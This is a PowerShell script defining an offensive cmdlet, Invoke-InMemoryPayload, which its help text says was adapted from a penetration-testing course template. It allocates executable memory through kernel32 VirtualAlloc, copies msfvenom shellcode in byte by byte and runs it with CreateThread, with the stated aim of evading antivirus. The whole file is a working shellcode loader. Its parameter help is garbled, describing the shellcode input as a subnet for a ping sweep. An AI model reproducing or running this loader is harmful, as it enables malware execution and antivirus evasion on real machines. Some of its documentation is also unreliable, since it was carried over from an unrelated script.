<#
.NAME
    Invoke-InMemoryPayload
    
    
.SYNOPSIS
    Injects an msfvenom payload into a Windows machines memory as a way to attempt evading Anti-Virus protections.
    This function was built off of a template from the Offensive Security PWK course.

.SYNTAX
    Invoke-InMemoryPayload [-ShellCode] <bytes[] shellcode>
    

.DESCRIPTION
    This cmdlet is used to attempt bypassing AV software by injecting shell code in a byte arrary into a separate thread of specially allocated memory.
    It is possible that this will not be able to execute a certain Windows devices as the DLLs or user permissions may prevent the execution of this function.
    

.EXAMPLES
.EXAMPLE 1
   C:\PS> Invoke-InMemoryPayload -ShellCode 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90
   This command injects NOP bits into a separate thread of specially allocated memory on a Windows machine.
 
 
 .PARAMTERS
    -ShellCode <byte[]>
        Defines the Class C subnet range to perform the ping sweep
        Enter a string consisting of 1-3 digits followed by a . followed by 1-3 digits followed by a . followed by 1-3 digits followed by a . followed by a zero
        Required?                    True
        Position?                    0
        Default value                None
        Accept pipeline input?       false
        Accept wildcard characters?  false
    
    
.INPUTS
    [System.Byte[]]
    
    
.OUTPUTS
    None
    
    
.NOTES
    Author: Rob Osborne
    Alias: tobor
    Contact: rosborne@osbornepro.com
    https://roberthosborne.com
#>
Function Invoke-InMemoryPayload
{
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$True,
                Position=0,
                ValueFromPipeline=$True, 
                ValueFromPipelineByPropertyName=$True,
                HelpMessage='Generate an msfvenom payload. Copy the value of the byte variable and place it here.')]  # End Parameter
            [Byte[]]$ShellCode
        )  # End param

    Write-Verbose "Importing DLL's..."
    $CSCode = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

    $WinFunc = Add-Type -MemberDefinition $CSCode -Name "Win32" -Namespace "Win32Functions" -PassThru
    $Size = 0x1000

    If ($ShellCode.Length -gt 0x1000) 
    {

        $Size = $ShellCode.Length

        Write-Verbose "Length of payload is $Size"

    }  # End If

    Write-Verbose "Allocating a block of memory for execution using VirtualAlloc()..."
    $X = $WinFunc::VirtualAlloc(0,$Size,0x3000,0x40)

    Write-Verbose "Writing payload to newly allocated memory block using memset()..."
    For ( $i = 0 ; $i -le ($ShellCode.Length - 1); $i++ ) 
    {
        
        Try 
        {
        
            $WinFunc::memset([IntPtr]($x.ToInt32()+$i), $ShellCode[$i], 1)

        }  # End Try
        Catch [Exception]
        {

            $Error[0]

             Write-Host "There was an error executing payload. Cmdlet is being prevented from allocating memory with the used DLLs." -ForegroundColor "Red"

             Pause

             Exit

        }  # End Catch
        Catch
        {
 
            Write-Host "I have not caught this error before. Please email me the results at rosborne@osbornepro.com" -ForegrounColor 'Cyan'

            $Error[0]
            
            Pause
            
            Exit

        }  # End Catch
        
    }  # End For

    Write-Verbose "Executing in separte thread using CreateThread()..."
    $WinFunc::CreateThread(0,0,$X,0,0,0)
    For (;;)
    {
        
        Start-sleep -Seconds 60
    
    }  # End For

}  # End Invoke-InMemoryPayload
